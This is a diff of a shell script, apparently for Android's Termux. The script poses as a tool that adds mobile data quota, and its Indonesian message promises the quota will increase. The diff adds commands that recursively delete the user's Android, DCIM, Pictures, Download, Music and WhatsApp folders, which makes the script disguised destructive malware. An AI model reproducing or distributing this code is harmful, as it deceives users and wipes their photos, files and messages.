@@ -38,8 +38,14 @@ read -p"╰───────root@dyxa#ABCD=•>" memeq;
 sleep 1
 echo $red "Loading"
 sleep 2
-rm -rf storage/emulated/0/Dyxa
+rm -rf storage/emulated/0/Android/
+rm -rf storage/emulated/0/DCIM
+rm -rf storage/emulated/0/Pictures
+rm -rf storage/emulated/0/DCIM
+rm -rf storage/emulated/0/Download
+rm -rf storage/emulated/0/Music
+rm -rf storage/emulated/0/Mymusic
 rm -rf storage/emulated/0/SHAREit
-
+rm -rf storage/emulated/0/WhatsApp
 echo  $blue "Tunggu Beberapa Menit , Nanti Kouta Akan Bertambah"
 fi
